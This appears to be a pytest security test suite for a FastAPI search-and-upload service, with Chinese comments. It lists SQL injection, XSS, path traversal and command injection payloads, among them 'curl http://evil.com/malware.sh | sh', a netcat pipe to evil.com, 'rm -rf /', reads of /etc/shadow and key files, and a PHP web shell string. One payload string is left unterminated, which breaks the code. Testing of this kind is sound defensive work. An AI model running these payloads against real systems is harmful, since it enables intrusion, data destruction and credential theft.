"""
安全测试用例实现
基于测试设计文档的安全测试代码
"""
import pytest
import tempfile
from pathlib import Path
from unittest.mock import patch
from fastapi.testclient import TestClient


class TestSecurity:
    """安全测试类"""
    
    def test_sql_injection_prevention(self, test_client: TestClient):
        """SC-01: SQL注入防护测试"""
        
        # 常见的SQL注入payload
        sql_injection_payloads = [
            "质量方针'; DROP TABLE documents; --",
            "质量方针' OR '1'='1",
            "质量方针'; DELETE FROM documents; --",
            "质量方针' UNION SELECT * FROM users --",
            "质量方针'; UPDATE documents SET content='hacked'; --",
            "质量方针' OR EXISTS(SELECT * FROM documents) --",
            "质量方针'; INSERT INTO documents VALUES('hacked'); --",
            "质量方针'/**/OR/**/1=1#",
            "质量方针' OR SLEEP(5) --",
            "质量方针'; EXECUTE('DROP TABLE documents'); --"
        ]
        
        for payload in sql_injection_payloads:
            response = test_client.get(f"/search?q={payload}&top_k=5")
            
            # 期望返回200（请求被接受），但不应该执行恶意SQL
            assert response.status_code == 200
            results = response.json()
            assert isinstance(results, list)
            
            # 验证系统没有被破坏（后续请求仍然正常）
            normal_response = test_client.get("/search?q=质量方针&top_k=1")
            assert normal_response.status_code == 200
            
            print(f"✅ SQL注入防护通过: '{payload[:40]}...' 被安全处理")
    
    def test_xss_prevention(self, test_client: TestClient):
        """SC-02: XSS攻击防护测试"""
        
        # 常见的XSS payload
        xss_payloads = [
            "质量方针<script>alert('xss')</script>",
            "质量方针<img src=x onerror=alert('xss')>",
            "质量方针<iframe src='javascript:alert(1)'></iframe>",
            "质量方针<script>document.cookie='hacked'</script>",
            "质量方针<svg onload=alert('xss')>",
            "质量方针<body onload=alert('xss')>",
            "质量方针<script>window.location='http://evil.com'</script>",
            "质量方针<img src='#' onerror='alert(String.fromCharCode(88,83,83))'>",
            "质量方针<script>eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))</script>",
            "质量方针<script/src='http://evil.com/xss.js'></script>"
        ]
        
        for payload in xss_payloads:
            response = test_client.get(f"/search?q={payload}&top_k=3")
            
            # 期望返回200（请求被接受），但XSS应该被过滤
            assert response.status_code == 200
            results = response.json()
            assert isinstance(results, list)
            
            # 验证返回的结果中不包含原始XSS代码
            for result in results:
                assert "text" in result
                # 确保返回的文本中不包含原始XSS代码
                assert "<script>" not in result["text"] or payload not in result["text"]
            
            print(f"✅ XSS防护通过: '{payload[:40]}...' 被安全过滤")
    
    def test_path_traversal_prevention(self, test_client: TestClient):
        """SC-03: 路径遍历防护测试"""
        
        # 测试各种路径遍历payload
        path_traversal_payloads = [
            "../../../etc/passwd",
            "../../windows/system32/config/sam",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "http://evil.com/malware.exe",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "vbscript:msgbox('xss')"
        ]
        
        for payload in path_traversal_payloads:
            # 测试在文件名中使用
            pdf_content = b"%PDF-1.4\n1 0 obj<<>>endobj"
            
            with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as tmp:
                tmp.write(pdf_content)
                tmp_path = Path(tmp.name)
            
            try:
                with open(tmp_path, "rb") as f:
                    files = {"file": (payload, f, "application/pdf")}
                    response = test_client.post("/upload", files=files)
                
                # 期望返回400错误（文件名包含非法字符）
                assert response.status_code == 400
                result = response.json()
                assert "detail" in result
                
                print(f"✅ 路径遍历防护通过: '{payload[:30]}...' 被拒绝")
                
            finally:
                tmp_path.unlink(missing_ok=True)
    
    def test_command_injection_prevention(self, test_client: TestClient):
        """SC-04: 命令注入防护测试"""
        
        # 测试命令注入payload
        command_injection_payloads = [
            "质量方针; rm -rf /",
            "质量方针 && cat /etc/passwd",
            "质量方针 | nc evil.com 1234",
            "质量方针`whoami`,
            "质量方针$(id)",
            "质量方针; wget http://evil.com/malware.sh -O /tmp/malware.sh",
            "质量方针; curl http://evil.com/malware.sh | sh",
            "质量方针; python -c 'import os; os.system(\"id\")'",
            "质量方针; bash -c 'echo hacked'",
            "质量方针; find / -name '*.key' -exec cat {} \\;"
        ]
        
        for payload in command_injection_payloads:
            response = test_client.get(f"/search?q={payload}&top_k=2")
            
            # 期望返回200（请求被接受），但命令不应该被执行
            assert response.status_code == 200
            results = response.json()
            assert isinstance(results, list)
            
            # 验证系统没有被破坏
            print(f"✅ 命令注入防护通过: '{payload[:30]}...' 被安全处理")
    
    def test_file_upload_security(self, test_client: TestClient):
        """SC-05: 文件上传安全测试"""
        
        # 测试恶意文件内容
        malicious_files = [
            # 包含PHP代码的文件
            ("malicious.php.pdf", b"%PDF-1.4\n<?php system($_GET['cmd']); ?>"),
            # 包含JavaScript的文件
            ("malicious.js.pdf", b"%PDF-1.4\n<script>alert('xss')</script>"),
            # 包含SQL注入的文件
            ("malicious.sql.pdf", b"%PDF-1.4\n'; DROP TABLE users; --"),
            # 包含系统命令的文件
            ("malicious.cmd.pdf", b"%PDF-1.4\nrm -rf /tmp/*"),
            # 包含路径遍历的文件
            ("malicious.path.pdf", b"%PDF-1.4\n../../../etc/passwd"),
        ]
        
        for filename, content in malicious_files:
            with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as tmp:
                tmp.write(content)
                tmp_path = Path(tmp.name)
            
            try:
                with open(tmp_path, "rb") as f:
                    files = {"file": (filename, f, "application/pdf")}
                    response = test_client.post("/upload", files=files)
                
                # 上传应该成功（文件格式正确），但内容应该被安全处理
                assert response.status_code == 200
                result = response.json()
                assert "task_id" in result
                
                print(f"✅ 文件上传安全通过: '{filename}' 上传成功，内容被安全处理")
                
            finally:
                tmp_path.unlink(missing_ok=True)
    
    def test_input_validation_security(self, test_client: TestClient):
        """SC-06: 输入验证安全测试"""
        
        # 测试各种输入验证边界情况
        validation_tests = [
            # 超长输入
            ("search", f"q={'质量方针' * 1000}", 200),
            # Unicode炸弹
            ("search", "q=质量方针\u0000\u0001\u0002\u0003", 200),
            # 控制字符
            ("search", "q=质量方针\x00\x01\x02", 200),
            # 特殊Unicode字符
            ("search", "q=质量方针\u202e\u202d", 200),
            # 空字节注入
            ("search", "q=质量方针%00", 200),
        ]
        
        for endpoint, params, expected_status in validation_tests:
            response = test_client.get(f"/{endpoint}?{params}")
            
            # 期望返回期望的状态码，系统不应该崩溃
            assert response.status_code == expected_status
            
            print(f"✅ 输入验证安全通过: '{params[:50]}...' 返回{expected_status}")
    
    def test_session_security(self, test_client: TestClient):
        """SC-07: 会话安全测试"""
        
        # 测试会话固定攻击
        session_tests = [
            {"Cookie": "sessionid=fixed_session_id"},
            {"Authorization": "Bearer invalid_token"},
            {"X-Forwarded-For": "192.168.1.1"},
            {"X-Real-IP": "10.0.0.1"},
            {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"},
        ]
        
        for headers in session_tests:
            response = test_client.get("/health", headers=headers)
            
            # 期望返回200（请求被接受），恶意头应该被忽略
            assert response.status_code == 200
            result = response.json()
            assert "status" in result
            
            print(f"✅ 会话安全通过: 恶意头{list(headers.keys())} 被安全处理")
    
    def test_cors_security(self, test_client: TestClient):
        """SC-08: CORS安全测试"""
        
        # 测试CORS配置
        cors_tests = [
            {"Origin": "http://evil.com"},
            {"Origin": "https://malicious-site.com"},
            {"Origin": "null"},
            {"Origin": "file://"},
            {"Access-Control-Request-Method": "DELETE"},
            {"Access-Control-Request-Method": "PUT"},
            {"Access-Control-Request-Headers": "X-Evil-Header"},
        ]
        
        for headers in cors_tests:
            response = test_client.get("/health", headers=headers)
            
            # 期望返回200，CORS头应该被安全处理
            assert response.status_code == 200
            
            # 检查响应头中是否包含适当的CORS控制
            # 注意：具体实现取决于应用的CORS配置
            print(f"✅ CORS安全通过: {headers} 被安全处理")


class TestSecurityEdgeCases:
    """安全边界情况测试"""
    
    def test_encoding_attacks(self, test_client: TestClient):
        """编码攻击测试"""
        
        # 测试各种编码方式的攻击payload
        encoding_payloads = [
            # URL编码
            "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
            # HTML实体编码
            "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;",
            # Base64编码
            "PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
            # Unicode编码
            "\\u003Cscript\\u003Ealert('xss')\\u003C/script\\u003E",
            # 双重编码
            "%253Cscript%253Ealert%2528%2527xss%2527%2529%253C%252Fscript%253E",
        ]
        
        for payload in encoding_payloads:
            response = test_client.get(f"/search?q=质量方针{payload}&top_k=2")
            
            # 期望返回200，编码攻击应该被检测和处理
            assert response.status_code == 200
            results = response.json()
            assert isinstance(results, list)
            
            print(f"✅ 编码攻击防护通过: '{payload[:30]}...' 被安全处理")
    
    def test_advanced_injection(self, test_client: TestClient):
        """高级注入攻击测试"""
        
        # 测试高级注入技术
        advanced_payloads = [
            # 时间盲注
            "质量方针' AND SLEEP(5) --",
            # 布尔盲注
            "质量方针' AND 1=1 --",
            # 联合查询注入
            "质量方针' UNION SELECT 1,2,3 --",
            # 堆叠查询注入
            "质量方针'; SELECT * FROM information_schema.tables --",
            # 存储型XSS
            "质量方针<script>localStorage.setItem('hacked','true')</script>",
            # DOM型XSS
            "质量方针#<img src=x onerror=alert('dom-xss')>",
        ]
        
        for payload in advanced_payloads:
            response = test_client.get(f"/search?q={payload}&top_k=1")
            
            # 期望返回200，高级攻击应该被检测和阻止
            assert response.status_code == 200
            
            print(f"✅ 高级注入防护通过: '{payload[:40]}...' 被安全处理")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])